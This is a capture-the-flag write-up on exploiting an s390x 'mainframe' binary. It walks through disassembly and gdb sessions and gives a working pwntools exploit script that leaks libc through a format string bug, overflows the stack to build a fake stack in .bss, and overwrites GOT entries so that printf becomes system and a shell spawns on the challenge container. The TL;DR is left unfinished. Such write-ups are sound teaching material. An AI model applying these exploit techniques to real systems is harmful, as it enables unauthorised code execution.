# Gibson

### Pwning a Novel Architecture

The description for this challenge is as follows:

*Can you really call it a "main"frame if I haven't used it before now?*

*Author: Research Innovations, Inc. (RII)*

This was one of only two challenges in the competition worth 1000 points, and as such, was one of the hardest challenges. The main challenge was the use of the s390 architecture on a binary that would otherwise be straightforward to exploit; this meant that documentation was sparse, a lot of traditional tooling worked badly or not at all, and a significant amount of time went into trying things out and watching the results in a debugger in an attempt to diagnose what was going wrong.


**TL;DR Solution:** Note the presence of both a significant buffer overflow and a format string vulnerability. IMPROVE HERE

## Gathering Information

Initially, I ran file on the mainframe binary provided in the .tar file. This revealed that this binary is compiled for the s390 architecture, and uses MSB (most significant bit) encoding instead of the usual LSB.
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x/bin$ file mainframe 
mainframe: ELF 64-bit MSB executable, IBM S/390, version 1 (SYSV), dynamically linked, interpreter /lib/ld64.so.1, BuildID[sha1]=5684ff421a651508bbe92190636290180d7e03c2, for GNU/Linux 3.2.0, not stripped
```
As a result, I am not going to be able to run this on my local system, and need to use the provided docker setup. As I recall, I was able to just run "docker-compose build" from the folder containing the Dockerfile once I had decompressed the downloadable; there were reports of people having trouble with this that seemed to mostly be resolved by making sure that you are running recent versions of docker and docker-compose. 

Once docker-compose is finished, you should have two new docker images, labelled gibson_s390x_infrastructure and gibson_s390x_competitor. We will mostly be using the competitor image since that allows for debugging (see the tips.md file in the docs folder).
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x/bin$ sudo docker images
[sudo] password for knittingirl: 
REPOSITORY                    TAG                   IMAGE ID       CREATED         SIZE
gibson_s390x_infrastructure   latest                615cf94db12e   4 days ago      984MB
gibson_s390x_competitor       latest                353c75491ee4   4 days ago      984MB
```
Once you have the image, you can run it to create a container; then you will want to check that the appropriate ports are open and what the container's IP address is. If everything is working correctly, you can connect in on port 8888 over netcat, then attach gdb-multiarch over port 1234 in another tab in order to debug.
```
knittingirl@piglet:~/CTF/CyberOpen22$ sudo docker run 353c75491ee4
[sudo] password for knittingirl: 
 * Starting internet superserver xinetd
   ...done.

knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ sudo docker ps
[sudo] password for knittingirl: 
CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                NAMES
24753634dfa7   353c75491ee4   "/bin/sh -c 'service…"   2 minutes ago   Up 2 minutes   1234/tcp, 8888/tcp   relaxed_volhard
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 24753634dfa7
172.17.0.2
```
Here is what the program looks like when the let it run in full:
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ nc 172.17.0.2 8888
GIBSON S390X
Enter payroll data:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Processing data...
333333333333333333333333333333333333333XRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR
```
And here is what we needed to do with gdb in another tab in order get there:
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x/bin$ gdb-multiarch ./mainframe 
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
...
gef➤  target remote 172.17.0.2:1234
Remote debugging using 172.17.0.2:1234
warning: remote target does not support file transfer, attempting to access files from local filesystem.
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
0x00007f9a6e274f70 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[!] Command 'context' failed to execute properly, reason: 'NoneType' object has no attribute 'all_registers'
gef➤  c
Continuing.
```
Since Ghidra does not seem to work on this architecture, we can also use gdb-multiarch as a disassembler for help with static analysis. Here is the full dump of the main function:
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000001000830 <+0>:	stmg	%r11,%r15,88(%r15)
   0x0000000001000836 <+6>:	lay	%r15,-1192(%r15)
   0x000000000100083c <+12>:	lgr	%r11,%r15
   0x0000000001000840 <+16>:	lgrl	%r1,0x1001ff0
   0x0000000001000846 <+22>:	lg	%r1,0(%r1)
   0x000000000100084c <+28>:	lghi	%r5,0
   0x0000000001000850 <+32>:	lghi	%r4,2
   0x0000000001000854 <+36>:	lghi	%r3,0
   0x0000000001000858 <+40>:	lgr	%r2,%r1
   0x000000000100085c <+44>:	brasl	%r14,0x1000694 <setvbuf@plt>
   0x0000000001000862 <+50>:	lgrl	%r1,0x1001ff8
   0x0000000001000868 <+56>:	lg	%r1,0(%r1)
   0x000000000100086e <+62>:	lghi	%r5,0
   0x0000000001000872 <+66>:	lghi	%r4,2
   0x0000000001000876 <+70>:	lghi	%r3,0
   0x000000000100087a <+74>:	lgr	%r2,%r1
   0x000000000100087e <+78>:	brasl	%r14,0x1000694 <setvbuf@plt>
   0x0000000001000884 <+84>:	aghik	%r1,%r11,160
   0x000000000100088a <+90>:	lghi	%r4,1024
   0x000000000100088e <+94>:	lghi	%r3,0
   0x0000000001000892 <+98>:	lgr	%r2,%r1
   0x0000000001000896 <+102>:	brasl	%r14,0x10006b4 <memset@plt>
   0x000000000100089c <+108>:	larl	%r2,0x1000a48
   0x00000000010008a2 <+114>:	brasl	%r14,0x1000654 <puts@plt>
   0x00000000010008a8 <+120>:	larl	%r2,0x1000a56
   0x00000000010008ae <+126>:	brasl	%r14,0x1000654 <puts@plt>
   0x00000000010008b4 <+132>:	aghik	%r1,%r11,160
   0x00000000010008ba <+138>:	lghi	%r4,2000
   0x00000000010008be <+142>:	lgr	%r3,%r1
   0x00000000010008c2 <+146>:	lghi	%r2,0
   0x00000000010008c6 <+150>:	brasl	%r14,0x10005f4 <read@plt>
   0x00000000010008cc <+156>:	larl	%r2,0x1000a6a
   0x00000000010008d2 <+162>:	brasl	%r14,0x1000654 <puts@plt>
   0x00000000010008d8 <+168>:	mvghi	1184(%r11),0
   0x00000000010008de <+174>:	j	0x1000904 <main+212>
   0x00000000010008e2 <+178>:	lg	%r1,1184(%r11)
   0x00000000010008e8 <+184>:	ic	%r1,160(%r1,%r11)
   0x00000000010008ec <+188>:	xilf	%r1,82
   0x00000000010008f2 <+194>:	lr	%r2,%r1
   0x00000000010008f4 <+196>:	lg	%r1,1184(%r11)
   0x00000000010008fa <+202>:	stc	%r2,160(%r1,%r11)
   0x00000000010008fe <+206>:	agsi	1184(%r11),1
   0x0000000001000904 <+212>:	lg	%r1,1184(%r11)
   0x000000000100090a <+218>:	clgfi	%r1,1023
   0x0000000001000910 <+224>:	jle	0x10008e2 <main+178>
   0x0000000001000914 <+228>:	lghi	%r2,0
   0x0000000001000918 <+232>:	brasl	%r14,0x1000634 <sleep@plt>
   0x000000000100091e <+238>:	aghik	%r1,%r11,160
   0x0000000001000924 <+244>:	lgr	%r2,%r1
   0x0000000001000928 <+248>:	brasl	%r14,0x1000614 <printf@plt>
   0x000000000100092e <+254>:	lhi	%r1,0
   0x0000000001000932 <+258>:	lgfr	%r1,%r1
   0x0000000001000936 <+262>:	lgr	%r2,%r1
   0x000000000100093a <+266>:	lmg	%r11,%r15,1280(%r11)
   0x0000000001000940 <+272>:	br	%r14
```
Based on the disassembly and our test run of the program, we can come up with some ideas about how this program works:

#1: The read call potentially reads in a lot of bytes; while we can't necessarily be sure without more testing, it looks like 2000 is deliberately loaded into the r4 register before the read call, which would make the most sense as the third argument of that function controlling the read length. While we don't necessarily know the full size of the buffer, 2000 may easily exceed that size.

When combined with the loading of the r2 register with 0 and the loading of the r3 register with something, this would also indicate that in the s390 architecture, the first argument is controlled by r2, the second by r3, and the third by r4.
```
   0x00000000010008b4 <+132>:	aghik	%r1,%r11,160
   0x00000000010008ba <+138>:	lghi	%r4,2000
   0x00000000010008be <+142>:	lgr	%r3,%r1
   0x00000000010008c2 <+146>:	lghi	%r2,0
   0x00000000010008c6 <+150>:	brasl	%r14,0x10005f4 <read@plt>
```
#2. The text printed out at the end of the program's run appears to just be our input with the characters XORed by 0x52, which would make sense for a series of a's, a newline, and a bunch of nulls.
```
>>> chr(ord('3') ^ ord('R'))
'a'
>>> chr(ord('X') ^ ord('R'))
'\n'
>>> chr(ord('R') ^ ord('R'))
'\x00'
>>> hex(ord('R'))
'0x52'
```
#3. The final print to console of our transformed input seems to be a call to printf. This may indicate that there is a format string vulnerability, especially since nothing is loaded into r3 which could potentially sanitize the input, i.e. it probably looks like "printf(buf);" rather than "printf("%s", buf);".
```
0x000000000100091e <+238>:	aghik	%r1,%r11,160
   0x0000000001000924 <+244>:	lgr	%r2,%r1
   0x0000000001000928 <+248>:	brasl	%r14,0x1000614 <printf@plt>
   0x000000000100092e <+254>:	lhi	%r1,0
   0x0000000001000932 <+258>:	lgfr	%r1,%r1
   0x0000000001000936 <+262>:	lgr	%r2,%r1
   0x000000000100093a <+266>:	lmg	%r11,%r15,1280(%r11)
   0x0000000001000940 <+272>:	br	%r14
```
## Testing Ideas:

So, at this point, we need to write a script and test out some of these things. I was able to use pwntools without issue by running the script then tabbing over to my gdb setup. I also set up a long timeout on my initial recvuntil since it would otherwise sporadically cause problems.

At this point, I should also note that I at least found that the docker got unusable if I crashed it, which obviously happened a lot. docker restart container_id will be your friend.

First, I determined that the program seems to be able to take 1144 bytes of input before it starts crashing by simply feeding in progressively larger payloads. So, I created a payload to both test out my format string idea by feeding in some %p's, appropriately transformed to decode with the XOR operation, and attempt to jump back to main.
```
def xorer(payload):
	result = b''
	for char in payload:
		result += (char ^ 0x52).to_bytes(1, 'big')
	return result

from pwn import *

target = remote('172.17.0.2', 8888)

main = 0x0000000001000830

print(target.recvuntil(b'Enter payroll data:', timeout=1000))
padding = b'a' * 1144
payload = padding

payload = xorer(b'%p' * 10)
payload += b'a' * (1144 - len(payload))
#Since s390 is MSB, I have to reverse my byte order.
payload += p64(main)[::-1]

target.sendline(payload)
target.interactive()
```
As some general housekeeping, since GEF didn't really like this architecture, I was able to determine that pswa seems to be analagous to the rip register on amd64 and set up an appropriate display so that I could see what is going on more easily. I also had to manually give it the address of an appropriate libc file so that I could view library functions more easily, which comes in useful later. I also set displays for my probable argument registers so that I could see what was going on more easily.
```
gef➤  info reg
pswm           0x100180000000      0x100180000000
pswa           0x1000830           0x1000830
...
gef➤  display/5i $pswa
2: x/5i $pswa
=> 0x1000830 <main>:	stmg	%r11,%r15,88(%r15)
   0x1000836 <main+6>:	lay	%r15,-1192(%r15)
   0x100083c <main+12>:	lgr	%r11,%r15
   0x1000840 <main+16>:	lgrl	%r1,0x1001ff0
   0x1000846 <main+22>:	lg	%r1,0(%r1)
gef➤  display/gx $r2
3: x/xg $r2  0x1:	<error: Cannot access memory at address 0x1>
gef➤  display/gx $r3
4: x/xg $r3  0x7f852db82c78:	0x00007f852db82e7a
gef➤  display/gx $r4
5: x/xg $r4  0x7f852db82c88:	0x00007f852db82e86
gef➤  set solib-search-path bin/libc.so.6
Reading symbols from /home/knittingirl/CTF/CyberOpen22/gibson_s390x/bin/libc.so.6...
```
With all that in mind, I can run my script and break at the end of main. The format string operation worked, and I appear to have a helpful libc leak:
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ python3 gibson_writeup.py 
[+] Opening connection to 172.17.0.2 on port 8888: Done
b'GIBSON S390X\nEnter payroll data:'
[*] Switching to interactive mode

Processing data...
(nil)0x7f717d0594d80x7f717d0594d80x10009b00x25702570257025700x25702570257025700x25702570333333330x33333333333333330x33333333333333330x333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333$  
```
```
gef➤  x/5i 0x7f717d0594d8
   0x7f717d0594d8:	.long	0x00007f71
   0x7f717d0594dc:	de	%f0,1472(%r5,%r9)
   0x7f717d0594e0:	.long	0x00007f71
   0x7f717d0594e4:	de	%f0,1264(%r5,%r9)
   0x7f717d0594e8:	.long	0x007b5ae7
gef➤  x/5i printf
   0x7f717c7a5b50 <printf>:	std	%f0,128(%r15)
   0x7f717c7a5b54 <printf+4>:	std	%f2,136(%r15)
   0x7f717c7a5b58 <printf+8>:	std	%f4,144(%r15)
   0x7f717c7a5b5c <printf+12>:	std	%f6,152(%r15)
   0x7f717c7a5b60 <printf+16>:	stmg	%r3,%r15,24(%r15)
```
On the buffer overflow front, once we get to the end of the main function, we can view all of the registers to see what has been affected. Most notably, all of the r11-r15 registers seem to have changed based on my input, and r14 specifically holds the address that I am trying to jump to. In the case of r15, we seem to have a partial overwrite with the newline character.
```
r11            0x6161616161616161  0x6161616161616161
r12            0x6161616161616161  0x6161616161616161
r13            0x6161616161616161  0x6161616161616161
r14            0x1000830           0x1000830
r15            0xa007f717d059998   0xa007f717d059998
```
When the jump occurs, it seems to get to the start of the main function initially, then crash on the first instruction, which seems to be operating on r11 and r15.
```
Program received signal SIGSEGV, Segmentation fault.
0x0000000001000830 in main ()
2: x/5i $pswa
=> 0x1000830 <main>:	stmg	%r11,%r15,88(%r15)
```
I will note at this point that I did try jumping into the various points in the middle of main to avoid dealing with this, but none really worked since most libc functions contain similar lines that cause crashes when called:
```
gef➤  disas setvbuf
Dump of assembler code for function setvbuf:
   0x00007f717c6c3960 <+0>:	stmg	%r6,%r15,48(%r15)
```
In order to determine what might be going wrong, let's have a look at what r11 and r15 are set to at the start of main during its initial run since those are the registers involved in the crashing instruction:
```
2: x/5i $pswa
=> 0x1000830 <main>:	stmg	%r11,%r15,88(%r15)
   0x1000836 <main+6>:	lay	%r15,-1192(%r15)
   0x100083c <main+12>:	lgr	%r11,%r15
   0x1000840 <main+16>:	lgrl	%r1,0x1001ff0
   0x1000846 <main+22>:	lg	%r1,0(%r1)
3: x/xg $r2  0x1:	<error: Cannot access memory at address 0x1>
4: x/xg $r3  0x7f717d059c78:	0x00007f717d059e7a
5: x/xg $r4  0x7f717d059c88:	0x00007f717d059e86
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────── registers ────
[!] Command 'context' failed to execute properly, reason: 'NoneType' object has no attribute 'all_registers'
gef➤  x/gx $r11
0x7f717d059c78:	0x00007f717d059e7a
gef➤  x/gx $r15
0x7f717d059998:	0x00007f717c8389f8
```
Basically, they seem to be somewhat analagous to rbp and rsp, and need to contain values for some sort of stack. Now, I've since realized that I probably could have avoided messing with r15 if I had just switched to send() instead of sendline() in order to avoid partial overwrite with the newline character, but I just didn't think of that at the time. Instead, since this binary has PIE disabled, I decided to use what should be analagous to the .bss section as a makeshift stack, since this is read-writable memory in a reliable location. Since vmmap and got don't seem to work with this architecture, I found the area by looking up a plt entry to find its got entry, and assuming that it should last a typical 0x1000 bytes:
```
gef➤  x/5i 0x1000654
   0x1000654 <puts@plt>:	larl	%r1,0x1002018 <puts@got.plt>
   0x100065a <puts@plt+6>:	lg	%r1,0(%r1)
   0x1000660 <puts@plt+12>:	br	%r1
   0x1000662 <puts@plt+14>:	basr	%r1,%r0
   0x1000664 <puts@plt+16>:	lgf	%r1,12(%r1)
gef➤  x/20gx 0x1002018
0x1002018 <puts@got.plt>:	0x0000000001000662	0x00007f717c66b750
0x1002028 <setvbuf@got.plt>:	0x00000000010006a2	0x00000000010006c2
0x1002038:	0x0000000000000000	0x0000000000000000
0x1002048 <completed.1>:	0x0000000000000000	0x0000000000000000
0x1002058:	0x0000000000000000	0x0000000000000000
0x1002068:	0x0000000000000000	0x0000000000000000
0x1002078:	0x0000000000000000	0x0000000000000000
```
So, what I ended up doing was to set r15 to a value near the end of this .bss section, and set r11-r13 to the same just to be safe. Now it seems to be working nicely, and I can jump to an arbitrary location within memory.

Here is my revised payload:
```
fake_stack_area = 0x1002f80

payload = padding

payload = xorer(b'%p' * 10)
payload += b'a' * (1144 - len(payload) - 8 * 3)
payload += p64(fake_stack_area)[::-1] * 3
payload += p64(main)[::-1]
payload += p64(fake_stack_area)[::-1]
```
And here is the program running with main being called again without issue:
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ python3 gibson_writeup.py 
[+] Opening connection to 172.17.0.2 on port 8888: Done
b'GIBSON S390X\nEnter payroll data:'
[*] Switching to interactive mode

Processing data...
(nil)0x7f0a437f14d80x7f0a437f14d80x10009b00x25702570257025700x25702570257025700x25702570333333330x33333333333333330x33333333333333330x333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333GIBSON S390X
Enter payroll data:
Processing data...
$ 
```
## Actually Planning an Exploit:

So, at this point, I really did not want to have to look for gadgets to populate registers and control my arguments. I did notice that the program does have a __libc_csu_init() function that I may experiment with later to see if some sort of ret2csu control of registers can be achievemed (if I do so and have success I'll append that to the end), but overall, my look at the available functions in GDB's disassembly did not seem very promising. Fortunately, the binary is compiled with only partial RELRO, which means that the GOT is writable. As a result, I decided to overwrite the printf instruction with system or execve, since that is the only function called on my own input, in which I can place "/bin/sh" at the start.
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ checksec bin/mainframe
[!] Could not populate PLT: AttributeError: arch must be one of ['aarch64', 'alpha', 'amd64', 'arm', 'avr', 'cris', 'i386', 'ia64', 'm68k', 'mips', 'mips64', 'msp430', 'none', 'powerpc', 'powerpc64', 's390', 'sparc', 'sparc64', 'thumb', 'vax']
[*] '/home/knittingirl/CTF/CyberOpen22/gibson_s390x/bin/mainframe'
    Arch:     em_s390-64-big
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x1000000)
```
Now, I could have used the format string vulnerability to overwrite the GOT entry. However, as I was debugging my script to get the reroll of main to work, I noticed something interesting, namely that the address that read() is writing to seems to be dependent on the r11 register, which I have control over. In the following GDB snippet, I jumped directly back to 0x00000000010008b4 (directly after the puts call before the read call), and set r11 and r15 as shown:
```
1: x/5i $pswa
=> 0x10008b4 <main+132>:	aghik	%r1,%r11,160
   0x10008ba <main+138>:	lghi	%r4,2000
   0x10008be <main+142>:	lgr	%r3,%r1
   0x10008c2 <main+146>:	lghi	%r2,0
   0x10008c6 <main+150>:	brasl	%r14,0x10005f4 <read@plt>
3: x/xg $r2  0x0:	<error: Cannot access memory at address 0x0>
4: x/xg $r3  0x7faeed38a720:	0x00007faeed38a720
5: x/xg $r4  0x482:	<error: Cannot access memory at address 0x482>
6: x/xg $r11  0x1002f80:	0x0000000000000000
7: x/xg $r15  0x1002f80:	0x0000000000000000
...
1: x/5i $pswa
=> 0x10008c2 <main+146>:	lghi	%r2,0
   0x10008c6 <main+150>:	brasl	%r14,0x10005f4 <read@plt>
   0x10008cc <main+156>:	larl	%r2,0x1000a6a
   0x10008d2 <main+162>:	brasl	%r14,0x1000654 <puts@plt>
   0x10008d8 <main+168>:	mvghi	1184(%r11),0
3: x/xg $r2  0x0:	<error: Cannot access memory at address 0x0>
4: x/xg $r3  0x1003020:	<error: Cannot access memory at address 0x1003020>
5: x/xg $r4  0x7d0:	<error: Cannot access memory at address 0x7d0>
6: x/xg $r11  0x1002f80:	0x0000000000000000
7: x/xg $r15  0x1002f80:	0x0000000000000000
```
The chain here seems to be that "aghik	%r1,%r11,160" adds 160 to r11 and store the results in r1. Then "lgr	%r3,%r1" moves the contents of r1 to r3. Obviously, this particular run ended with nothing getting written anywhere since r3 ended up as unallocated memory, but if I start setting r11 to the start of the GOT - 160, I can do my read directly to the GOT and avoid having to write a format string overwrite.

## Writing the Exploit

In a sample run of the program, the GOT area looks like this:
```
gef➤  x/10gx 0x1002000
0x1002000 <read@got.plt>:	0x00007f0f2119ddd0	0x00007f0f21101070
0x1002010 <sleep@got.plt>:	0x00007f0f211760c0	0x00007f0f2111f150
0x1002020 <__libc_start_main@got.plt>:	0x00007f0f210c7750	0x00007f0f2111f960
0x1002030 <memset@got.plt>:	0x00007f0f2114dd40	0x0000000000000000
0x1002040:	0x0000000000000000	0x0000000000000000
gef➤  x/10gx 0x1002008
0x1002008 <printf@got.plt>:	0x00007f0f21101070	0x00007f0f211760c0
0x1002018 <puts@got.plt>:	0x00007f0f2111f150	0x00007f0f210c7750
0x1002028 <setvbuf@got.plt>:	0x00007f0f2111f960	0x00007f0f2114dd40
0x1002038:	0x0000000000000000	0x0000000000000000
0x1002048 <completed.1>:	0x0000000000000000	0x0000000000000000
```
My plan is to have the start of my input be /bin/sh\x00 so that whatever I overwrite printf with has that as its first argument, so the read GOT entry is getting overwritten with that string. The next entry is printf itself, which I will be overwriting with either execve or system, whatever works. I can get the address of these functions based on the format string libc leak. Finally, I opted to overwrite puts to be portions of main() shortly before the printf call, which means I get to avoid the XORing operation and not mess with my potentially fragile stack. This gets appended to the end up my existing script:
```
libc = ELF('bin/libc.so.6')

print(target.recvuntil(b'nil)'))
libc_leak = target.recv(14)
print(libc_leak)
printf_libc = int(libc_leak, 16) - 0x9b4468
print('the printf libc address should be at ', printf_libc)
libc_base = printf_libc - libc.symbols['printf']
execve = libc_base + libc.symbols['execve']
system = libc_base + libc.symbols['system']
sleep = libc_base + libc.symbols['sleep']
print('execve should be at', hex(execve))

payload2 = b'/bin/sh\x00' + p64(execve)[::-1] + p64(sleep)[::-1] + p64(main+238)[::-1]
target.sendline(payload2)
```
And here is what the GOT area looks like following the read call:
```
gef➤  x/10gx 0x1002000
0x1002000 <read@got.plt>:	0x2f62696e2f736800	0x00007f0f21176c00
0x1002010 <sleep@got.plt>:	0x00007f0f211760c0	0x000000000100091e
0x1002020 <__libc_start_main@got.plt>:	0x0a007f0f210c7750	0x00007f0f2111f960
0x1002030 <memset@got.plt>:	0x00007f0f2114dd40	0x0000000000000000
0x1002040:	0x0000000000000000	0x0000000000000000
gef➤  x/10gx 0x1002008
0x1002008 <printf@got.plt>:	0x00007f0f21176c00	0x00007f0f211760c0
0x1002018 <puts@got.plt>:	0x000000000100091e	0x0a007f0f210c7750
0x1002028 <setvbuf@got.plt>:	0x00007f0f2111f960	0x00007f0f2114dd40
0x1002038:	0x0000000000000000	0x0000000000000000
0x1002048 <completed.1>:	0x0000000000000000	0x0000000000000000
```
This brings us neatly into an execve call, with /bin/sh as the first argument. As you can see, r3 and r4 were non-null, which is probably why execve failed (it didn't segfault, it just didn't really do anything):
```
1: x/5i $pswa
=> 0x7f8ad542fc00 <execve>:	svc	11
   0x7f8ad542fc02 <execve+2>:	lghi	%r4,-4095
   0x7f8ad542fc06 <execve+6>:	clgr	%r2,%r4
   0x7f8ad542fc0a <execve+10>:	jgnl	0x7f8ad542fc12 <execve+18>
   0x7f8ad542fc10 <execve+16>:	br	%r14
3: x/xg $r2  0x1002000 <read@got.plt>:	0x2f62696e2f736800
4: x/xg $r3  0x1002000 <read@got.plt>:	0x2f62696e2f736800
5: x/xg $r4  0x7d0:	<error: Cannot access memory at address 0x7d0>
```
Fortunately, system worked to spawn a shell!
```
1: x/5i $pswa
=> 0x7fbd2b56f1b0 <system>:	cgije	%r2,0,0x7fbd2b56f1bc <system+12>
   0x7fbd2b56f1b6 <system+6>:	jg	0x7fbd2b56ecf0
   0x7fbd2b56f1bc <system+12>:	stmg	%r14,%r15,112(%r15)
   0x7fbd2b56f1c2 <system+18>:	larl	%r2,0x7fbd2b6a114e
   0x7fbd2b56f1c8 <system+24>:	lay	%r15,-160(%r15)
3: x/xg $r2  0x1002000 <read@got.plt>:	0x2f62696e2f736800
4: x/xg $r3  0x1002000 <read@got.plt>:	0x2f62696e2f736800
5: x/xg $r4  0x7d0:	<error: Cannot access memory at address 0x7d0>
```
```
knittingirl@piglet:~/CTF/CyberOpen22/gibson_s390x$ python3 gibson_writeup.py 
[+] Opening connection to 172.17.0.2 on port 8888: Done
b'GIBSON S390X\nEnter payroll data:'
[!] Could not populate PLT: AttributeError: arch must be one of ['aarch64', 'alpha', 'amd64', 'arm', 'avr', 'cris', 'i386', 'ia64', 'm68k', 'mips', 'mips64', 'msp430', 'none', 'powerpc', 'powerpc64', 's390', 'sparc', 'sparc64', 'thumb', 'vax']
[*] '/home/knittingirl/CTF/CyberOpen22/gibson_s390x/bin/libc.so.6'
    Arch:     em_s390-64-big
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
b'\nProcessing data...\n(nil)'
b'0x7fbd2bf2f4d8'
the printf libc address should be at  140450452713584
execve should be at 0x7fbd2b5f0c00
[*] Switching to interactive mode
0x7fbd2bf2f4d80x10009b00x25702570257025700x25702570257025700x25702570333333330x33333333333333330x33333333333333330x333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333$ ls
flag
mainframe
wrapper.sh
$ cat flag
This is not a valid flag
```
Thanks for reading!
